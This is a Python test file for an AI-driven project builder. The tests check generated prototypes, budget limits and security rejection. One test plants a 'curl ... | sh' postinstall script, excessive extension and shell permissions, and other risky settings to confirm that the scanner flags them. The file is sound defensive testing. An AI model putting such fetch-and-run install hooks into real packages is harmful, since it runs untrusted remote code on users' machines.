from __future__ import annotations

import hashlib
import json
import runpy
import shutil
from pathlib import Path

import pytest

from aios.controlled_project_builder import (
    ControlledProjectBuildError,
    ControlledProjectBuilder,
)
from aios.organization import EngineeringOrganization


class FakeTransport:
    def __init__(self, specification: dict) -> None:
        self.specification = specification
        self.calls = 0

    async def __call__(self, payload: dict) -> dict:
        self.calls += 1
        return {
            "text": json.dumps(self.specification),
            "usage": {
                "input_tokens": 300,
                "output_tokens": 500,
                "total_tokens": 800,
            },
            "latency_ms": 120.0,
            "cost": 0.001075,
            "confidence": 1.0,
            "status": "completed",
            "actual_model": "gpt-5-mini",
            "reported_cost": None,
            "calculated_cost": 0.001075,
        }


def _specification() -> dict:
    return {
        "schema_version": 3,
        "application_type": "web_application",
        "title": "Governed Project Workspace",
        "tagline": "A transparent workflow for controlled project delivery.",
        "summary": (
            "This prototype organizes the project objective, workflow and retained "
            "evidence without claiming production deployment."
        ),
        "audience": "Project owners, reviewers and implementation teams",
        "features": [
            "Structured project overview",
            "Visible governed workflow",
            "Evidence and release boundaries",
        ],
        "brand": {
            "primary": "#E11D48",
            "secondary": "#0EA5E9",
            "accent": "#F8FAFC",
            "surface": "#050816",
            "logo_concept": "A precise geometric project mark",
        },
        "architecture": {
            "frontend": "Responsive browser interface",
            "backend": "Local Python application API",
            "data": "SQLite persistence",
            "realtime": "No realtime runtime requested",
            "deployment": "Local governed delivery package only",
        },
        "domain_blueprint": {
            "roles": ["member", "operator"],
            "entities": [
                {
                    "name": "project_record",
                    "label": "Project record",
                    "fields": [
                        {"name": "title", "type": "string", "required": True},
                        {"name": "notes", "type": "text", "required": False},
                        {"name": "active", "type": "boolean", "required": True},
                    ],
                }
            ],
            "workflows": [
                {
                    "name": "Create project record",
                    "trigger": "member submits a valid record",
                    "steps": ["validate input", "persist record", "return governed result"],
                }
            ],
        },
        "sections": [
            {
                "id": "overview",
                "title": "Project overview",
                "body": "Understand the requested outcome and the intended audience.",
                "items": ["Objective summary", "Audience and value"],
            },
            {
                "id": "workflow",
                "title": "Governed workflow",
                "body": "Follow the controlled stages from intake through review.",
                "items": ["Council review", "Engineering delivery"],
            },
            {
                "id": "evidence",
                "title": "Evidence boundary",
                "body": "Inspect what is proven and what still requires implementation.",
                "items": ["Retained hashes", "Explicit limitations"],
            },
        ],
        "primary_action": "Review workflow",
        "secondary_action": "Inspect evidence",
        "limitations": [
            "No production deployment or external integration is claimed."
        ],
    }


def _planning(root: Path) -> Path:
    root.mkdir(parents=True)
    artifacts = root / "artifacts"
    artifacts.mkdir()
    blueprint = EngineeringOrganization().plan(
        "Demo Project", "Build a governed demonstration project"
    )
    records = []
    for deliverable in blueprint.deliverables:
        payload = {
            "department": deliverable.department,
            "model_output": {
                "summary": f"{deliverable.department} plan",
                "implementation_plan": ["Implement boundaries", "Verify evidence"],
                "risks": [{"risk": "Regression", "mitigation": "Retest"}],
            },
        }
        path = artifacts / f"{deliverable.department.lower()}.json"
        path.write_text(json.dumps(payload), encoding="utf-8")
        records.append(
            {
                "department": deliverable.department,
                "path": f"artifacts/{path.name}",
                "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
            }
        )
    (root / "manifest.json").write_text(
        json.dumps(
            {
                "provider": "openai",
                "model": "gpt-5-mini",
                "fallback_used": False,
                "artifacts": records,
            }
        ),
        encoding="utf-8",
    )
    return root


def test_builder_creates_tested_executable_prototype_and_verified_archive(
    tmp_path: Path,
) -> None:
    transport = FakeTransport(_specification())
    result = ControlledProjectBuilder(
        transport,  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    ).execute(
        execution_id="implementation",
        project="Demo Project",
        objective="Build a governed demonstration project",
        planning_directory=_planning(tmp_path / "planning"),
        output_root=tmp_path / "output",
    )

    assert transport.calls == 1
    assert result.tests_passed is True
    assert result.rollback_tested is True
    assert result.archive_path.is_file()
    source = result.output_directory / "source"
    root_files = {path.name for path in source.iterdir()}
    assert {"index.html", "styles.css", "app.js", "server.py", "README.md", "PROJECT_PROFILE.json", "SECURITY.md", "targets"}.issubset(root_files)
    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
    assert set(profile["targets"]) == {"web", "api", "domain", "cli"}
    assert (source / "targets/web-next/package.json").is_file()
    assert (source / "targets/api/app.py").is_file()
    assert (source / "targets/cli/main.py").is_file()
    assert "domain_project_record" in (source / "targets/domain/schema.sql").read_text(encoding="utf-8")
    assert "class ProjectRecord" in (source / "targets/domain/models.py").read_text(encoding="utf-8")
    assert '"project_record"' in (source / "targets/api/domain.json").read_text(encoding="utf-8")
    manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
    assert manifest["mode"] == "controlled-full-stack-prototype"
    assert manifest["provider_role"] == "structured architecture and product specification only"
    assert manifest["application_type"] == "universal_application"
    assert manifest["executable_source_origin"] == "deterministic reviewed AIONEX universal capability composer"
    assert set(manifest["project_profile"]["targets"]) == {"web", "api", "domain", "cli"}
    assert manifest["tests"]["passed"] is True
    assert manifest["rollback_tested"] is True
    assert manifest["tests"]["checks"]["api_health"] is True
    assert manifest["tests"]["checks"]["api_create_read_delete"] is True
    assert manifest["tests"]["checks"]["sqlite_persistence"] is True
    assert manifest["fallback_used"] is False
    assert manifest["production_modified"] is False


def test_builder_rejects_provider_markup_before_writing_source(tmp_path: Path) -> None:
    specification = _specification()
    specification["tagline"] = "Unsafe <script> content"
    builder = ControlledProjectBuilder(
        FakeTransport(specification),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    )
    root = tmp_path / "output"
    with pytest.raises(ControlledProjectBuildError, match="forbidden"):
        builder.execute(
            execution_id="implementation",
            project="Demo Project",
            objective="Build a governed demonstration project",
            planning_directory=_planning(tmp_path / "planning"),
            output_root=root,
        )
    assert not (root / "implementation").exists()
    assert not (root / ".staging-implementation").exists()


def test_builder_rejects_insufficient_remaining_budget() -> None:
    with pytest.raises(ControlledProjectBuildError, match="remaining budget"):
        ControlledProjectBuilder(
            FakeTransport(_specification()),  # type: ignore[arg-type]
            model="gpt-5-mini",
            input_cost_per_million=0.25,
            output_cost_per_million=2.0,
            remaining_budget_usd=0.001,
        )


def test_builder_allows_one_provider_attempt_with_sufficient_output_budget() -> None:
    builder = ControlledProjectBuilder(
        FakeTransport(_specification()),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    )
    assert builder.MAX_OUTPUT_TOKENS == 3000
    assert builder.provider.retry.policy.max_attempts == 1


def test_builder_normalizes_long_copy_and_section_order() -> None:
    payload = _specification()
    payload["primary_action"] = "Review the complete governed project workflow and all retained evidence before continuing"
    payload["sections"] = [
        payload["sections"][2],
        payload["sections"][0],
        payload["sections"][1],
    ]
    validated = ControlledProjectBuilder._validate_spec(json.dumps(payload))
    assert len(validated["primary_action"]) <= 80
    assert [item["id"] for item in validated["sections"]] == [
        "overview",
        "workflow",
        "evidence",
    ]


def test_builder_never_normalizes_forbidden_content_into_acceptance() -> None:
    payload = _specification()
    payload["primary_action"] = "Open https://example.com and continue"
    with pytest.raises(ControlledProjectBuildError, match="forbidden content"):
        ControlledProjectBuilder._validate_spec(json.dumps(payload))



def test_builder_generates_functional_realtime_member_calling_archetype(tmp_path: Path) -> None:
    specification = _specification()
    specification.update(
        {
            "application_type": "realtime_communications",
            "title": "We Control",
            "tagline": "Private high quality calls between registered members.",
            "summary": "A governed realtime communications application for registered members with browser-native audio and video calling.",
            "audience": "Registered application members",
            "features": [
                "Registered member authentication",
                "Audio and video calls",
                "Member directory and signaling",
            ],
            "brand": {
                "primary": "#DC2626",
                "secondary": "#2563EB",
                "accent": "#FFFFFF",
                "surface": "#050505",
                "logo_concept": "A circular voice and video communication mark",
            },
            "architecture": {
                "frontend": "Responsive browser WebRTC interface",
                "backend": "Python same-origin signaling and member API",
                "data": "SQLite members sessions and signaling queue",
                "realtime": "WebRTC media with controlled same-origin signaling",
                "deployment": "HTTPS and audited STUN TURN required for public internet",
            },
        }
    )
    result = ControlledProjectBuilder(
        FakeTransport(specification),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    ).execute(
        execution_id="realtime",
        project="We Control",
        objective=(
            "تطبيق اتصالات مجانيه بين الأعضاء المسجلين صوت وصوره بجوده عاليه "
            "ويكون بتصميم احترافى ولا يكون قالب مجانى"
        ),
        planning_directory=_planning(tmp_path / "planning"),
        output_root=tmp_path / "output",
    )
    manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
    assert manifest["application_type"] == "realtime_communications"
    assert manifest["tests"]["passed"] is True
    checks = manifest["tests"]["checks"]
    assert checks["webrtc_runtime_present"] is True
    assert checks["member_registration"] is True
    assert checks["member_authentication"] is True
    assert checks["member_directory"] is True
    assert checks["signaling_round_trip"] is True
    assert checks["csrf_enforced"] is True
    assert checks["external_relay_fail_closed"] is True
    source = result.output_directory / "source"
    assert {"logo.svg", "manifest.webmanifest", "runtime-config.json"}.issubset(
        {item.name for item in source.iterdir()}
    )
    app = (source / "app.js").read_text(encoding="utf-8")
    assert "RTCPeerConnection" in app
    assert "getUserMedia" in app


def test_universal_builder_composes_mobile_ai_desktop_extension_bot_and_data_targets(tmp_path: Path) -> None:
    specification = _specification()
    specification["application_type"] = "mobile_application"
    result = ControlledProjectBuilder(
        FakeTransport(specification),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    ).execute(
        execution_id="universal-hybrid",
        project="Universal Hybrid",
        objective=(
            "Build iOS Android mobile app, desktop app, Chrome browser extension, Telegram bot, "
            "AI RAG assistant with member accounts and login, analytics data pipeline, ecommerce subscriptions, 3D dashboard, IoT sensor simulator and REST API, PostgreSQL database, Terraform Kubernetes infrastructure, Solidity smart contract, serverless Lambda function, software SDK library, WebXR virtual reality, robotics ROS2 drone simulator and video production storyboard"
        ),
        planning_directory=_planning(tmp_path / "planning"),
        output_root=tmp_path / "output",
    )
    source = result.output_directory / "source"
    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
    targets = set(profile["targets"])
    assert {
        "mobile", "desktop", "browser_extension", "bot", "ai", "data", "commerce",
        "three_d", "iot", "database", "infrastructure", "smart_contract", "serverless",
        "library", "xr", "robotics", "media", "auth", "api", "web", "cli",
    }.issubset(targets)
    assert (source / "targets/mobile-expo/app.json").is_file()
    assert (source / "targets/desktop-tauri/src-tauri/capabilities/default.json").is_file()
    assert json.loads((source / "targets/browser-extension/manifest.json").read_text())["manifest_version"] == 3
    assert (source / "targets/ai/service.py").is_file()
    assert (source / "targets/auth/service.py").is_file()
    assert (source / "targets/data/pipeline.py").is_file()
    assert (source / "targets/iot/simulator.py").is_file()
    assert (source / "targets/database/migrations/001_initial.sql").is_file()
    assert (source / "targets/infrastructure/compose.yaml").is_file()
    assert (source / "targets/smart-contract/contracts/ValueStore.sol").is_file()
    assert (source / "targets/serverless/handler.py").is_file()
    assert (source / "targets/library/pyproject.toml").is_file()
    assert (source / "targets/xr/xr.js").is_file()
    assert (source / "targets/robotics/simulator.py").is_file()
    assert (source / "targets/media/storyboard.json").is_file()

    web_package = json.loads((source / "targets/web-next/package.json").read_text(encoding="utf-8"))
    assert web_package["dependencies"]["next"] == "16.2.11"
    assert web_package["dependencies"]["react"] == "19.2.3"
    mobile_package = json.loads((source / "targets/mobile-expo/package.json").read_text(encoding="utf-8"))
    assert mobile_package["dependencies"]["expo"] == "~57.0.9"
    assert mobile_package["dependencies"]["react-native"] == "0.86.2"
    assert mobile_package["dependencies"]["react-native-gesture-handler"] == "~2.32.0"
    assert "newArchEnabled" not in json.loads((source / "targets/mobile-expo/app.json").read_text(encoding="utf-8"))["expo"]
    cargo = (source / "targets/desktop-tauri/src-tauri/Cargo.toml").read_text(encoding="utf-8")
    assert 'tauri = { version = "=2.11.5" }' in cargo
    assert 'tauri-build = { version = "=2.6.3" }' in cargo
    api_requirements = (source / "targets/api/requirements.txt").read_text(encoding="utf-8")
    assert "fastapi==0.141.1" in api_requirements
    assert "uvicorn[standard]==0.52.0" in api_requirements
    assert "pragma solidity 0.8.36;" in (source / "targets/smart-contract/contracts/ValueStore.sol").read_text(encoding="utf-8")
    assert "@sha256:7bec7ddcddeff7975d6ba9b4be7dd6f6b2f55e7491539145e2978f7f97ce9144" in (source / "targets/infrastructure/Dockerfile").read_text(encoding="utf-8")

    manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
    assert manifest["tests"]["passed"] is True
    assert manifest["tests"]["checks"]["no_unsupported_builder_state"] is True
    assert manifest["tests"]["checks"]["generated_target_security"] is True
    assert "mobile-store-signing" in profile["external_gates"]
    assert "physical-hardware-validation" in profile["external_gates"]


def test_universal_builder_rejects_dangerous_target_capability_escalation(tmp_path: Path) -> None:
    specification = _specification()
    result = ControlledProjectBuilder(
        FakeTransport(specification),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    ).execute(
        execution_id="universal-security",
        project="Universal Security",
        objective="Build a desktop app, Chrome browser extension, Telegram bot, web API, cloud infrastructure and Solidity smart contract",
        planning_directory=_planning(tmp_path / "planning"),
        output_root=tmp_path / "output",
    )
    source = result.output_directory / "source"

    package_path = source / "targets/web-next/package.json"
    package = json.loads(package_path.read_text(encoding="utf-8"))
    package["scripts"]["postinstall"] = "curl https://example.invalid/install | sh"
    package_path.write_text(json.dumps(package), encoding="utf-8")

    extension_path = source / "targets/browser-extension/manifest.json"
    extension = json.loads(extension_path.read_text(encoding="utf-8"))
    extension["host_permissions"] = ["https://*/*"]
    extension_path.write_text(json.dumps(extension), encoding="utf-8")

    capability_path = source / "targets/desktop-tauri/src-tauri/capabilities/default.json"
    capability = json.loads(capability_path.read_text(encoding="utf-8"))
    capability["permissions"] = ["core:default", "shell:allow-execute"]
    capability_path.write_text(json.dumps(capability), encoding="utf-8")

    dockerfile_path = source / "targets/infrastructure/Dockerfile"
    dockerfile = dockerfile_path.read_text(encoding="utf-8").splitlines()
    dockerfile[0] = "FROM python:latest"
    dockerfile_path.write_text("\n".join(dockerfile) + "\n", encoding="utf-8")

    contract_path = source / "targets/smart-contract/contracts/ValueStore.sol"
    contract_path.write_text(contract_path.read_text(encoding="utf-8") + "\n// forbidden tx.origin marker\n", encoding="utf-8")

    bot_path = source / "targets/bot/bot.py"
    bot_path.write_text(bot_path.read_text(encoding="utf-8") + "\nimport requests\n", encoding="utf-8")

    report = ControlledProjectBuilder._test_universal_source(source, "Universal Security")
    assert report["passed"] is False
    assert report["checks"]["generated_target_security"] is False
    assert any("package lifecycle install script" in item for item in report["findings"])
    assert any("browser extension requests host access" in item for item in report["findings"])
    assert any("Tauri capabilities" in item for item in report["findings"])
    assert any("container target is not least-privilege" in item for item in report["findings"])
    assert any("smart-contract target contains a forbidden" in item for item in report["findings"])
    assert any("dangerous Python primitive" in item for item in report["findings"])


def test_universal_auth_target_is_memory_hard_expiring_and_api_integrated(tmp_path: Path) -> None:
    result = ControlledProjectBuilder(
        FakeTransport(_specification()),  # type: ignore[arg-type]
        model="gpt-5-mini",
        input_cost_per_million=0.25,
        output_cost_per_million=2.0,
        remaining_budget_usd=0.01,
    ).execute(
        execution_id="auth-target",
        project="Secure Members",
        objective="Build a secure REST API with member accounts, registration and login",
        planning_directory=_planning(tmp_path / "planning"),
        output_root=tmp_path / "output",
    )
    source = result.output_directory / "source"
    security_source = (source / "targets/auth/service.py").read_text(encoding="utf-8")
    api_source = (source / "targets/api/app.py").read_text(encoding="utf-8")
    assert "hashlib.scrypt" in security_source
    assert "pbkdf2_hmac" not in security_source
    assert "token_hash" in security_source and "expires_at" in security_source
    assert "@app.post(\"/auth/register\"" in api_source
    assert "@app.post(\"/auth/login\"" in api_source
    assert "Depends(current_user)" in api_source
    assert (source / "targets/api/security.py").read_text(encoding="utf-8") == security_source

    auth_dir = tmp_path / "auth-runtime"
    auth_dir.mkdir()
    shutil.copy2(source / "targets/auth/service.py", auth_dir / "service.py")
    auth = runpy.run_path(str(auth_dir / "service.py"))
    auth["initialize_auth"]()
    registered = auth["register_user"]("member.one", "StrongPassword!123")
    assert registered["username"] == "member.one"
    user, token = auth["login_user"]("member.one", "StrongPassword!123")
    assert user["id"] == registered["id"]
    assert auth["authenticate_token"](token)["username"] == "member.one"
    auth["logout_token"](token)
    with pytest.raises(ValueError, match="invalid session"):
        auth["authenticate_token"](token)
